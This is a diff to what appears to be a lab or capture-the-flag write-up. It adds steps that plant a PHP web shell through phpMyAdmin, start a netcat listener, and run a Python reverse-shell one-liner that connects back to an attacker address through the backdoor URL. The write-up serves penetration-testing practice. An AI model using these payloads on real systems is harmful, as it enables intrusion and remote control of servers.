@@ -8,7 +8,7 @@ Find the IP of our VM:
 `nmap -sP $ADDRESS_RANGE` ($IP_ADDR)
 
 Find the exposed ports and services running them:
-`sudo nmap -O $IP_ADDR`
+`nmap $IP_ADDR`
 ```shell
 PORT    STATE SERVICE
 21/tcp  open  ftp
@@ -60,5 +60,20 @@ The website links to the source code and we can find [the hash function](https:/
 <!-- https://www.hackingarticles.in/shell-uploading-web-server-phpmyadmin/ -->
 <!-- https://www.netspi.com/blog/technical/network-penetration-testing/linux-hacking-case-studies-part-3-phpmyadmin/ -->
 Creating a backdoor in phpmyadmin:
+`SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/forum/templates_c/backdoor.php"`
 ![Setting up the backdoor](../images/writeup3/phpmyadmin_backdoor.png)
 ![Seeing the backdoor in working](../images/writeup3/backdoor_in_working.png)
+
+
+We need to set up a listener in our terminal:
+```shell
+$ netcat -nvklp 4242
+```
+
+This is the command we want to execute:
+`python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'` (graciously stolen from [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python))
+
+so just browse to this URL:
+https://${IP_ADDRESS}/forum/templates_c/backdoor.php?cmd=${CMD}
+
+Now we have a shell, and can continue exploiting.
